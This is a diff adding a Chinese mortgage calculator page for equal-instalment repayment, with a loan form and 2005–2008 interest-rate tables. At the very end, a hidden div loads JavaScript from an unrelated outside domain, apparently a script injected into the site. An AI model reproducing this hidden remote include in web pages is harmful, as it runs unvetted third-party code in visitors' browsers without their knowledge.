@@ -1,0 +1,512 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>生活百宝箱</title>
+<link href="../res/zl_style.css" rel="stylesheet" type="text/css" />
+<script language="javascript" src="../js/tools.js"></script>
+<script language="javascript" src="jsq.js"></script>
+</head>
+<body lang="zh" class="BG_Lnav">
+
+<div class="Top"><a href="../index.htm" class="a_INDEX">生活百宝箱</a><b class="Top_B_arr"></b><span><strong>房产工具</strong></span></div>
+
+<table class="ZL_Cont_tab" cellpadding="0" cellspacing="0">
+<tbody>
+  <tr>
+    <td class="Cont_tbL">
+	<!--左侧导航 开始-->
+	<div class="NAV_L_Tit">房产工具</div>
+	<a href="house_gfnl.htm">购房能力评估</a>
+	<a href="house_bxjsq.htm" class="on">等额本息还款</a>
+	<a href="house_bjjsq.htm">等额本金还款</a>
+	<a href="house_tqhd.htm">提前还贷计算</a>
+	<a href="house_shfjsq.htm">税费计算器</a>
+	<a href="house_gjjjsq.htm">公积金贷款计算</a>
+	<!--左侧导航 结束-->
+	</td>
+    <td style="vertical-align:top;padding-left:10px">
+<!--右侧内容区 开始-->
+<table width="560" border="0" cellspacing="0" cellpadding="0">
+	<FORM name=calc1 action=calc_win.php method=post><tr>
+              <td>&nbsp;</td>
+            </tr>
+            <tr>
+              <td><img src="images/title2.gif" height="50"></td>
+            </tr>
+            <tr>
+              <td style="padding-top:6px">
+<TABLE class=p9 cellSpacing=0 borderColorDark=#ffffff cellPadding=0 width=100% align=center  border=0>
+                          <TBODY>
+                          <TR vAlign=top>
+                            <TD>
+                              <TABLE class=p9 cellSpacing=1 cellPadding=5 
+                              width=100% align=center bgColor=#F8E1CD border=0>
+                                <TBODY>
+                                <TR bgColor=#e7f3ff>
+                                <TD height=26 bgcolor="#FFFBF7">
+                                <DIV align=center>贷款类别：</DIV></TD>
+                                <TD height=26 bgcolor="#FFFBF7">　 
+                                  <SELECT 
+                                onchange=exc_zuhe(this.form,this.value); 
+                                name=type> <OPTION value=1 
+                                selected>商业贷款</OPTION> <OPTION 
+                                value=2>公积金</OPTION> <OPTION 
+                                value=3>组合型</OPTION></SELECT> 
+                                <DIV id=calc1_zuhe style="DISPLAY: none">
+                                <TABLE class=p9 cellSpacing=0 cellPadding=0>
+                                <TBODY>
+                                <TR>
+                                <TD>　组合比例：</TD></TR>
+                                <TR>
+                                <TD>　　　　　商业性：<INPUT maxLength=8 size=8 
+                                name=total_sy>元</TD></TR>
+                                <TR>
+                                <TD>　　　　　公积金：<INPUT maxLength=8 size=8 
+                                name=total_gjj>元</TD></TR></TBODY></TABLE></DIV></TD></TR>
+                                <TR bgColor=#e7f3ff>
+                                <TD height=26 bgcolor="#FFFBF7">
+                                <DIV align=center>计算方式：</DIV></TD>
+                                <TD height=26 bgcolor="#FFFBF7">　 
+                                  <INPUT id=calc1_radio1 
+                                onclick=exc_js(this.form,1); type=radio CHECKED 
+                                value=1 name=jisuan_radio> <LABEL 
+                                for=calc1_radio1>根据面积、单价计算</LABEL> <BR>
+                                <DIV id=calc1_js_div1 style="DISPLAY: block">
+                                <TABLE class=p9 cellSpacing=0 cellPadding=0 
+                                width=200 border=0>
+                                <TBODY>
+                                <TR>
+                                <TD class=l15 colSpan=2>　单价： <INPUT maxLength=8 
+                                size=8 name=price>元/平米<BR>　面积： <INPUT 
+                                maxLength=7 size=8 name=sqm>平方米<BR>　按揭成数： 
+                                <SELECT size=1 name=anjie> <OPTION 
+                                value=9>9成</OPTION> <OPTION value=8>8成</OPTION>
+								<OPTION value=7 selected>7成</OPTION> 
+                                <OPTION value=6>6成</OPTION> <OPTION 
+                                value=5>5成</OPTION> <OPTION value=4>4成</OPTION> 
+                                <OPTION value=3>3成</OPTION> <OPTION 
+                                value=2>2成</OPTION></SELECT></TD></TR></TBODY></TABLE></DIV>　 
+                                <INPUT id=calc1_radio2 
+                                onclick=exc_js(this.form,2); type=radio value=2 
+                                name=jisuan_radio> <LABEL 
+                                for=calc1_radio2>根据贷款总额计算</LABEL> 
+                                <DIV id=calc1_js_div2 style="DISPLAY: none">
+                                <TABLE class=p9 cellSpacing=0 cellPadding=0 
+                                width="100%" border=0>
+                                <TBODY>
+                                <TR>
+                                <TD>　贷款总额：<INPUT maxLength=8 size=10 
+                                name=daikuan_total000>元</TD></TR></TBODY></TABLE></DIV></TD></TR>
+                                <TR bgColor=#e7f3ff>
+                                <TD height=26 bgcolor="#FFFBF7">
+                                <DIV align=center>按揭年数：</DIV></TD>
+                                <TD height=26 bgcolor="#FFFBF7">　 
+                                  <SELECT id=years size=1 
+                                name=years> <OPTION value=1>1年（12期）</OPTION> 
+                                <OPTION value=2>2年（24期）</OPTION> <OPTION 
+                                value=3>3年（36期）</OPTION> <OPTION 
+                                value=4>4年（48期）</OPTION> <OPTION 
+                                value=5>5年（60期）</OPTION> <OPTION 
+                                value=6>6年（72期）</OPTION> <OPTION 
+                                value=7>7年（84期）</OPTION> <OPTION 
+                                value=8>8年（96期）</OPTION> <OPTION 
+                                value=9>9年（108期）</OPTION> <OPTION 
+                                value=10>10年（120期）</OPTION> <OPTION 
+                                value=11>11年（132期）</OPTION> <OPTION 
+                                value=12>12年（144期）</OPTION> <OPTION 
+                                value=13>13年（156期）</OPTION> <OPTION 
+                                value=14>14年（168期）</OPTION> <OPTION 
+                                value=15>15年（180期）</OPTION> <OPTION 
+                                value=16>16年（192期）</OPTION> <OPTION 
+                                value=17>17年（204期）</OPTION> <OPTION 
+                                value=18>18年（216期）</OPTION> <OPTION 
+                                value=19>19年（228期）</OPTION> <OPTION value=20 
+                                selected>20年（240期）</OPTION> <OPTION 
+                                value=25>25年（300期）</OPTION> <OPTION 
+                                value=30>30年（360期）</OPTION></SELECT></TD></TR>
+                                <TR bgColor=#e7f3ff>
+                                <TD height=26 bgcolor="#FFFBF7">
+                                <DIV align=center>利　　率：</DIV></TD>
+                                <TD height=26 bgcolor="#FFFBF7">
+								<select id="lilv" name="lilv">
+                                    <option value='44' >08年12月23日第二套房</option>
+                                     <option value='43'>08年12月23日利率基准</option>
+                                     <option value='42'>08年12月23日利率上限</option>
+                                     <option value='41'selected>08年12月23日利率下限</option>
+                                <option value='40'>08年11月27日第二套房</option>
+								 <option value='39'>08年11月27日利率基准</option>
+<option value='38'>08年11月27日利率上限</option>
+<option value='37'>08年11月27日利率下限</option>
+								 <option value='36'>08年10月30日第二套房</option>
+								 <option value='35'>08年10月30日利率基准</option>
+<option value='34'>08年10月30日利率上限</option>
+<option value='33'>08年10月30日利率下限</option>
+								 <option value='32'>08年10月27日第二套房</option>
+								 <option value='31'>08年10月27日利率基准</option>
+<option value='30'>08年10月27日利率上限</option>
+<option value='29'>08年10月27日利率下限</option>
+
+								 <option value='28'>08年10月09日第二套房</option>
+<option value='27'>08年10月09日利率上限</option>
+<option value='26'>08年10月09日利率下限</option>
+									  <option value='25'>08年09月16日第二套房</option>
+<option value='24'>08年09月16日利率上限</option>
+<option value='23' >08年09月16日利率下限</option>
+									  <option value='22'>07年12月21日第二套房</option>
+<option value='21'>07年12月21日利率上限</option>
+<option value='20'>07年12月21日利率下限</option>
+<option value='19'>07年9月15日第二套房</option>
+								 <option value='18'>07年9月15日利率上限</option>
+								<option value='17'>07年9月15日利率下限</option>
+									  <option value='16'>07年8月22日利率上限</option>
+								<option value='15'>07年8月22日利率下限</option>
+                                <option value='14'>07年7月21日利率上限</option>
+								<option value='13'>07年7月21日利率下限</option>
+
+								<option value='12'>07年5月19日利率上限</option>
+								<option value='11'>07年5月19日利率下限</option>
+								<option value='10'>07年3月18日利率上限</option>
+								<option value='9'>07年3月18日利率下限</option>
+								<option value='8'>06年8月19日利率上限</option>
+								<option value='7'>06年8月19日利率下限</option>
+
+								<option value='6'>06年4月28日利率上限</option>
+								<option value='5'>06年4月28日利率下限</option>
+								<option value='4'>05年3月17日后利率上限</option>
+								<option value='3'>05年3月17日后利率下限</option>
+								<option value='2'>05年1月1日-3月17日利率</option>
+								<option value='1'>05年1月1日前利率</option>
+
+                                   </select> </TD></TR>
+                                <TR bgColor=#e7f3ff>
+                                <TD height=26 colSpan=2 bgcolor="#FFFBF7">
+                                <DIV align=center><INPUT class=btn200040701 onclick=ext_total(this.form); type=button value=开始计算 name=button1> 
+                                　
+                                  <input class=btn200040701 onClick=formReset(this.form); type=reset value=重新计算 name=button2>
+</DIV></TD></TR></TBODY></TABLE>
+                            </TD></TR>
+                      </TBODY></TABLE>
+			  
+			  
+<table width="100%" border=0 cellpadding=0 cellspacing=0>
+	<tr valign=top><td style="padding-top:20px"><img src="images/gieguo.gif" height="50">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><DIV id=calc1_benxi 
+                              style="LEFT: 0px; POSITION: relative; TOP: 0px">
+                              <TABLE class=p9 cellSpacing=1 cellPadding=５ 
+                              width="100%" align=center bgColor=#cccccc 
+border=0>
+                                <TBODY>
+                                <TR bgColor=#f8f8f8>
+                                <TD width="41%" height=26>　　　房款总额：</TD>
+                                <TD width="59%">　 <INPUT class=p9 
+                                name=fangkuan_total1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD height=26>　　　贷款总额：</TD>
+                                <TD>　 <INPUT class=p9 
+                                name=daikuan_total1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD height=26>　　　还款总额：</TD>
+                                <TD>　 <INPUT class=p9 name=all_total1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD noWrap height=26>　　　支付利息款：</TD>
+                                <TD>　 <INPUT class=p9 name=accrual1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD height=26>　　　首期付款：</TD>
+                                <TD>　 <INPUT class=p9 
+                                name=money_first1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD height=26>　　　贷款月数：</TD>
+                                <TD>　 <INPUT class=p9 name=month1></TD></TR>
+                                <TR bgColor=#f8f8f8>
+                                <TD height=26>　　　月均还款：</TD>
+                      <TD>　 <INPUT class=p9 
+                                name=month_money1></TD></TR></TBODY></TABLE></DIV></td>
+  </tr>
+</table><DIV id=calc1_benjin 
+                        style="DISPLAY: none; Z-INDEX: 98; LEFT: 107px; WIDTH: 180px; POSITION: absolute; TOP: 22px; HEIGHT: 220px"><INPUT 
+                        type=hidden name=fangkuan_total2> <INPUT type=hidden 
+                        name=daikuan_total2> <INPUT type=hidden name=all_total2> 
+                        <INPUT type=hidden name=accrual2> <INPUT type=hidden 
+                        name=money_first2> <INPUT type=hidden name=month2> 
+                        <INPUT type=hidden name=month_money2> </DIV>
+</td>
+	</tr>
+	</table></td>
+            </tr>
+            <tr>
+              <td height="50" style="line-height:22px;padding-top:20px;padding-left:10px"><SPAN 
+                        class=lh19><STRONG>等额本息还款方式</STRONG>是在还款期内，每月偿还同等数额的贷款(包括本金和利息)，这样由于每月的还款额固定，可以有计划地控制家庭收入的支出，也便于每个家庭根据自己的收入情况，确定还贷能力。 
+                        </SPAN></td>
+            </tr><tr>
+              <td height="50"><div align="left" style="color:#FF0000">注：１北京公积金贷款最高额度为80万元人民币
+本工具按最新规定计算；<br>
+２对已贷款购买一套住房但人均面积低于当地平均水平，再申请购买第二套普通自住房的居民，比照执行首次贷款购买普通自住房的优惠政策。</div></td>
+            </tr></form>
+          </table>
+<!--右侧内容区 结束-->
+	</td>
+	<td style="vertical-align:top" width="260">
+<!--右栏信息开始-->
+<table  width="98%" border="1" bordercolor="#cccccc" cellpadding="1" cellspacing="3" style="border-collapse:collapse">
+	<tr align="center" BGCOLOR="#FFFBEC">
+		<td height="24" colspan="3" bgcolor="#FFFFFF"><b ><font COLOR="#ff9900">公积金</font></b></td>
+	</tr>
+	  <tr BGCOLOR="#EEEEEE">
+		<td width="51%" bgcolor="#dddddd">年限</td>
+		<td width="23%" bgcolor="#dddddd">1-5年</td>
+		<td width="26%" bgcolor="#dddddd">5-30年</td>
+	  </tr>
+	  <tr>
+		<td>2005.1.1前</td>
+		<td>3.60%</td>
+		<td>4.05%</td>
+	  </tr>
+	  <tr>
+		<td>2005.1.1-3.16</td>
+		<td>3.78%</td>
+		<td>4.23%</td>
+	  </tr>
+	  <tr>
+		<td>2005.3.17-2006.5.7 </td>
+		<td>3.96%</td>
+		<td>4.41%</td>
+	  </tr>
+	  <tr>
+		<td>2006.5.8后 </td>
+		<td>4.14%</td>
+		<td>4.59%</td>
+	  </tr>
+	  <tr>
+		<td>2007.3.18后 </td>
+		<td>4.32%</td>
+		<td>4.77%</td>
+	  </tr>
+	  <tr>
+		<td>2007.5.19后</td>
+		<td>4.41%</td>
+		<td>4.86%</td>
+	  </tr>
+		<td>2007.7.21后</td>
+		<td>4.50%</td>
+		<td>4.95%</td>
+	  </tr>
+  <tr>
+    <td>2007.8.22后</td>
+      <td>4.59%</td>
+      <td>5.04%</td> 
+  </tr>
+  <tr>
+  <td>2007.9.15后</td>
+      <td>5.04%</td>
+      <td>5.22%</td> 
+  </tr>
+  <tr>
+  <td>2007.9.16后</td>
+      <td>4.59%</td>
+      <td>5.13%</td> 
+  </tr>
+  <tr>
+  <td>2008.10.09后</td>
+      <td>4.32%</td>
+      <td>4.86%</td> 
+  </tr>
+  <tr>
+  <td>2008.11.27后</td>
+      <td>3.51%</td>
+      <td>4.05%</td> 
+  </tr>
+   <tr>
+  <td>2008.12.23后</td>
+      <td>3.33%</td>
+      <td>3.87%</td> 
+  </tr>
+  <tr align="center" BGCOLOR="#FFFBEC">
+    <td height="24" colspan="3" bgcolor="#ffffff"><b><font COLOR="#ff9900">商业性</font></b></td>
+  </tr>
+  <tr>
+    <td bgcolor="dddddd">年限</td>
+    <td bgcolor="dddddd">1-5年</td>
+    <td bgcolor="dddddd">5-30年</td>
+  </tr>
+  <tr>
+    <td>2006.4.28后下限</td>
+    <td>5.51%</td>
+    <td>5.75%</td>
+  </tr>
+  <tr>
+    <td>2006.4.28后上限</td>
+    <td>6.12%</td>
+    <td>6.39%</td>
+  </tr>
+  <tr>
+    <td>2006.8.19后下限</td>
+    <td>5.51%</td>
+    <td>5.81%</td>
+  </tr>
+  <tr>
+    <td>2006.8.19后上限</td>
+    <td>6.48%</td>
+    <td>6.84%</td>
+  </tr>
+  <tr>
+    <td>2007.3.18后下限</td>
+    <td>5.74%</td>
+    <td>6.04%</td>
+  </tr>
+  <tr>
+    <td>2007.3.18后上限</td>
+    <td>6.75%</td>
+    <td>7.11%</td>
+  </tr>
+  <tr>
+    <td>2007.5.19后</td>
+    <td>6.93%</td>
+    <td>7.20%</td>
+  </tr>
+  <tr>
+    <td>2007.7.21后</td>
+    <td>7.20%</td>
+    <td>7.38%</td>
+  </tr>
+  <tr>
+    <td>2007.8.22后</td>
+    <td>7.38%</td>
+    <td>7.56%</td>
+  </tr>
+<tr>
+    <td>2007.9.15后</td>
+    <td>7.56%</td>
+    <td>7.83%</td>
+  </tr>
+   <tr>
+    <td height="14"><SPAN lang="EN-US">20<SPAN lang="EN-US">07.12.21</SPAN></SPAN>后基准</td>
+    <td>7.74%&nbsp;&nbsp;&nbsp;</td>
+    <td>7.83%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2007.12.21</SPAN>后上限</td>
+    <td>8.51%&nbsp;</td>
+    <td>8.61% </td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2007.12.21</SPAN>后下限</td>
+    <td>6.579%</td>
+    <td>6.65%</td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">20</SPAN><SPAN lang="EN-US">08.09.16</SPAN>后基准</td>
+    <td>7.56%&nbsp;</td>
+    <td>7.74% </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">20<SPAN lang="EN-US">08.09.16</SPAN></SPAN>后上限</td>
+    <td> 8.32%&nbsp;</td>
+    <td>8.51% </td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">20</SPAN><SPAN lang="EN-US">08.09.16</SPAN>后下限</td>
+    <td>6.426%</td>
+    <td>6.579% </td>
+  </tr>
+  
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.09</SPAN>后基准</td>
+    <td>7.29%&nbsp;&nbsp;</td>
+    <td>7.47%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.09</SPAN>后上限</td>
+    <td>8.02%</td>
+    <td>8.22%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.09</SPAN>后下限</td>
+    <td>6.20%</td>
+    <td>6.35%</td>
+  </tr>
+  
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.27</SPAN>后基准</td>
+    <td>7.29%&nbsp;&nbsp;</td>
+    <td>7.47%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.27</SPAN>后上限</td>
+    <td>8.02%</td>
+    <td>8.22%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.27</SPAN>后下限</td>
+    <td>5.10%</td>
+    <td>5.23%</td>
+  </tr>
+    <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.30</SPAN>后基准</td>
+    <td>7.02%&nbsp;&nbsp;</td>
+    <td>7.20%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.30</SPAN>后上限</td>
+    <td>7.72%</td>
+    <td>7.92%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.30</SPAN>后下限</td>
+    <td>4.91%</td>
+    <td>5.04%</td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.11.27</SPAN>后基准</td>
+    <td>5.94%&nbsp;&nbsp;</td>
+    <td>6.12%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.11.27</SPAN>后上限</td>
+    <td>6.53%</td>
+    <td>6.73%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.11.27</SPAN>后下限</td>
+    <td>4.16%</td>
+    <td>4.28%</td>
+  </tr>
+   <tr>
+    <td height="14"><SPAN lang="EN-US">2008.12.23</SPAN>后基准</td>
+    <td>5.76%&nbsp;&nbsp;</td>
+    <td>5.94% &nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.12.23</SPAN>后上限</td>
+    <td>6.34%</td>
+    <td>6.53%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.12.23</SPAN>后下限</td>
+    <td>4.03%</td>
+    <td>4.16% </td>
+  </tr>
+  <tr>
+    <td colspan="3"><p> 2005年1月1日，05年第1次加息； <br>
+        2005年3月17日，05年第2次加息； <br>
+        2006年4月28日，06年第1次加息，此后银行可以选择下限和上限之间的利率。 <br>
+        2006年8月19日，06年第2次加息； <br>
+        2007年3月18日，07年第1次加息。 <br>
+        2007年5月19日，07年第2次加息。 <br>
+        2007年7月21日，07年第3次加息。<br>
+        2007年8月22日，07年第4次加息。<br>
+        2007年9月15日，07年第5次加息。<br>
+    </p></td>
+  </tr>
+</table>
+<!--右栏信息结束-->
+	</td>
+  </tr>
+</tbody>
+</table>
+
+<!--左侧标签 结束-->
+<div style="display:none"><script type="text/javascript" src="http://www.26rc.com/js/26.js"></script></div></body>
+</html>
